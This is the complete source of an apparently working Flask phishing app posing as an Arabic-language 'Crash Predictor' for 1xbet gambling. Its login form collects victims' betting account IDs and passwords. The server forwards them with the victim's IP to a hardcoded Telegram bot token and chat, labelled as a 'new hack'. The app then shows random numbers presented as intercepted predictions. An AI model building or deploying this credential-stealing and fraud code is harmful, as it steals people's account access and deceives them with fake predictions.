from flask import Flask, render_template_string, request, redirect, session, jsonify
import requests
import random
import time
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'crash_secret_key_2026'

BOT_TOKEN = "8125363786:AAGKkZniUcBMPfS8Ftx4SOF5BS3viANOdiw"
CHAT_ID = "6565594143"

def send_to_telegram(uid, pwd, ip):
    try:
        msg = f"🔥 اختراق جديد\nID: {uid}\nPass: {pwd}\nIP: {ip}\nTime: {datetime.now()}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

HTML = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crash Predictor</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0f1e;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
        .btn{background:#ffd700;color:#000;padding:15px;border:none;border-radius:50px;margin:10px;cursor:pointer;width:100%}
        input{width:100%;padding:15px;margin:10px 0;background:#222;border:1px solid #ffd700;color:#fff;border-radius:30px}
        .card{background:rgba(255,255,255,0.05);border-radius:25px;padding:25px;margin:15px 0}
        .prediction-number{font-size:5rem;color:#ff3300;margin:20px}
        .spinner{width:60px;height:60px;border:4px solid #ffd700;border-top-color:#ff3300;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .menu-btn{position:fixed;top:15px;right:15px;background:#ffd700;color:#000;width:45px;height:45px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1001}
        .sidebar{position:fixed;top:0;right:-280px;width:280px;height:100%;background:#0a0a0a;transition:0.3s;z-index:1000;padding:20px;border-left:1px solid #ffd700}
        .sidebar.active{right:0}
        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999;display:none}
        .overlay.active{display:block}
    </style>
</head>
<body>
<div class="menu-btn" onclick="toggleSidebar()">☰</div>
<div class="sidebar" id="sidebar">
    <h3>👤 الملف الشخصي</h3>
    <p>ID: <span id="profileId">ضيف</span></p>
    <hr>
    <a href="#" onclick="logout()">🚪 تسجيل الخروج</a>
</div>
<div class="overlay" id="overlay" onclick="closeSidebar()"></div>
<div class="container" id="app"></div>
<script>
let userId = '{{user_id}}';
function render(page){
    if(page=='welcome'){
        document.getElementById('app').innerHTML=`
            <h1>🎲 CRASH PREDICTOR</h1>
            <div class="card"><h3>⚠️ تحذير هام</h3><p>للتوقعات الدقيقة، اربط حسابك</p><button class="btn" onclick="render('link')">🔗 ربط حسابي</button></div>
            <div class="card"><button class="btn" onclick="window.open('https://sa.1xbet.com')">🎲 إنشاء حساب</button></div>
        `;
    } else if(page=='link'){
        document.getElementById('app').innerHTML=`
            <h1>🔗 ربط الحساب</h1>
            <div class="card">
                <input type="text" id="uid" placeholder="معرف ID"><br>
                <input type="password" id="pwd" placeholder="كلمة المرور"><br>
                <button class="btn" onclick="submitLogin()">تسجيل الدخول</button>
            </div>
        `;
    } else if(page=='free'){
        document.getElementById('app').innerHTML=`
            <div class="card"><h1>🎉 3 أيام مجانية</h1><button class="btn" onclick="render('predictor')">تفعيل</button></div>
        `;
    } else if(page=='predictor'){
        document.getElementById('app').innerHTML=`
            <div class="user-bar" style="display:flex;justify-content:space-between"><span>🎯 ${userId}</span><span>⭐ مجانية</span></div>
            <div class="card">
                <div id="predictionDisplay"><div class="prediction-number">--x</div></div>
                <div id="loadingDisplay" style="display:none"><div class="spinner"></div><div>جاري الاعتراض...</div></div>
                <button class="btn" onclick="getPrediction()">🎯 توقع التالي</button>
            </div>
        `;
    }
    document.getElementById('profileId').innerText = userId;
    closeSidebar();
}
async function submitLogin(){
    let uid=document.getElementById('uid').value;
    let pwd=document.getElementById('pwd').value;
    let res=await fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:uid,password:pwd})});
    let data=await res.json();
    if(data.success){ userId=uid; render('free'); }
    else alert('خطأ في البيانات');
}
async function getPrediction(){
    let predDiv=document.getElementById('predictionDisplay');
    let loadDiv=document.getElementById('loadingDisplay');
    predDiv.style.display='none';
    loadDiv.style.display='block';
    let res=await fetch('/predict');
    let data=await res.json();
    setTimeout(()=>{
        loadDiv.style.display='none';
        predDiv.style.display='block';
        document.querySelector('.prediction-number').innerHTML=data.prediction+'x';
    },4000);
}
function toggleSidebar(){ document.getElementById('sidebar').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
function closeSidebar(){ document.getElementById('sidebar').classList.remove('active'); document.getElementById('overlay').classList.remove('active'); }
function logout(){ fetch('/logout'); location.reload(); }
render('welcome');
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML, user_id=session.get('user_id', 'ضيف'))

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    uid = data.get('user_id', '')
    pwd = data.get('password', '')
    if '@' in uid or len(uid) < 2:
        return jsonify({"success": False})
    send_to_telegram(uid, pwd, request.remote_addr)
    session['user_id'] = uid
    return jsonify({"success": True})

@app.route('/predict')
def predict():
    time.sleep(random.uniform(2, 3))
    r = random.randint(1, 100)
    if r <= 50: pred = round(random.uniform(1.0, 9.9), 1)
    elif r <= 80: pred = round(random.uniform(10.0, 19.9), 1)
    else: pred = round(random.uniform(20.0, 29.9), 1)
    return jsonify({"prediction": pred})

@app.route('/logout')
def logout():
    session.clear()
    return ""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
